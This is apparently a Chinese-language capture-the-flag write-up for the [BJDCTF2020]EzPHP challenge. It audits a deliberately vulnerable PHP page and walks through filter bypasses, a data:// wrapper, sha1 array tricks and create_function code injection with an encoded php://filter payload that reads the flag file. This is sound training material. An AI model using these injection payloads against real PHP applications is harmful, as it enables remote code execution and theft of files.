---
title: '[BJDCTF2020]EzPHP'
date: 2024-06-20 21:06:45
tags: php特性
categories: 刷题笔记
---

## [BJDCTF2020]EzPHP（代码审计&create_function的使用）

我们查看源码，发现一串base32加密的字符串

![image-20240620210847610](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406202108647.png)

我们解码，得到一个文件

<!--more-->

![image-20240620210910046](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406202109077.png)

我们访问这个文件，发现一长串代码

```
<?php
highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?>
```

这是要进行代码审计啊

我们一层一层解析

**1.$_SERVER['QUERY_STRING']绕过**

```
if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}
```

$_SERVER['QUERY_STRING']得到?之后的输入东西

**$_SERVER['QUERY_STRING']**函数不对传入的东西进行url编码，所以把payload进行url编码之后传入即可绕过



**2.正则匹配绕过**

```
if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');
```

debu的第一行要能匹配aqua_is_cute，但又不能等于aqua_is_cute，我们用换行符%0a进行绕过

```
debu=aqua_is_cute%0a
```

**'/\^\$/'正则匹配，^表示开头，$表示结尾**，现在需要绕过[preg_match](https://so.csdn.net/so/search?q=preg_match&spm=1001.2101.3001.7020)，所以在dedu=aqua_is_cute末尾加上换行来代替（也就是**加上%0a**）

**3.$_REQUEST**绕过

```
if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value)) 
        //要求不能有字母
            die('fxck you! I hate English!'); 
    } 
} 
```

```
$_POST优先级高于$_GET,所以用POST传入的值会把$_GET中的值覆盖掉
```

1和2中可知，需要用file和debu传值，所以此处用**POST传入file=xxx&debu=xxx**可以绕过(xxx可以是任何不为0的数)



**4.file_get_contents绕过**

```
if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");
```

我们使用data伪协议

```
file=data://text/plain,debu_debu_aqua
```



**5.sha1函数、比较类型数组绕过**

```
if ( sha1($shana) === sha1($passwd) && $shana != $passwd )
//既要shana和passwd传入的值不相同，又要这两个传入的值经过sha1散列之后强相等
{
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}
```

sha1函数的参数是数组是，会返回false，所以可以用

```
shana[]=0&passwd[]=1
```

则所有的payload为

```
file=data://text/plain,debu_debu_aque&debu=aque_is_cute%0a&shana[]=0&passwd[]=1

post
file=1&debu=1
```



url编码之后

```
file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2

post
file=1&debu=1
```

成功绕过前面5层



**6.create_function运用**

```
if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort
|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id
|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin
|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) 
//ban了这么这么多，肯定不能用一般方法传入payload了
{ 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";//包含了flag.php这个文件
    $code('', $arg);
} ?>
```

```
$code`和`$arg`可控，利用`$code('',$arg)`进行`create_function注入
```

**create_function**注入详解：https://www.cnblogs.com/-qing-/p/10816089.html

6.1由第5步中可见，需要通过flag[arg]=xxx，flag[code]=xxx传参

6.2利用create_function,对于

```
$aaa = create_function('$a, $b', 'return $a+$b;');

```

相当于

```
function aaa($a, $b){
    return $a+$b;
}  
```

对于

```
$code=return $a+$b;}fction();//
```

相当于

```
function aaa($a, $b){
    return $a+$b;
}  
fction();//}（fction为某个任意函数，"//"可以注释掉后面的内容）
```

应用到本题,可以得到

```php
flag[code]=create_function&flag[arg]=}fction();//
```

6.3由于包含了flag.php这个文件，为了查看所以用到两个函数

**var_dump**：[PHP: var_dump - Manual](https://www.php.net/manual/zh/function.var-dump.php)

**get_defined_vars()**：[PHP get_defined_vars() 函数 | PHP 教程 - 码农教程](https://www.codercto.com/courses/d/863.html)

可以利用**`get_defined_vars()`**将所有变量和值都进行输出

所以构造payload：

```
flag[code]=create_function&flag[arg]=}var_dump(get_defined_vars());//
```

6.4字母和数字都被ban了，所以跟前面一样，用url编码一下

```
file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2&%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&%66%6c%61%67%5b%61%72%67%5d=}%76%61%72%5f%64%75%6d%70(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//
```

6.5 提示了flag在rea1fl4g.php里，所以考虑用require函数，php//filter读取文件

![image-20240620214829404](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406202148506.png)

```
require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)
```

url编码之后

```
require(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f)
```

利用异或或者~进行取反操作

```
require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))
```

替换上一步中的**var_dump(get_defined_vars())**

最终最终的payload

```
/1nD3x.php?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2&%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&%66%6c%61%67%5b%61%72%67%5d=}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))
;//
```

![image-20240620214951418](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406202149455.png)

解码得到flag

![image-20240620215037544](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406202150708.png)
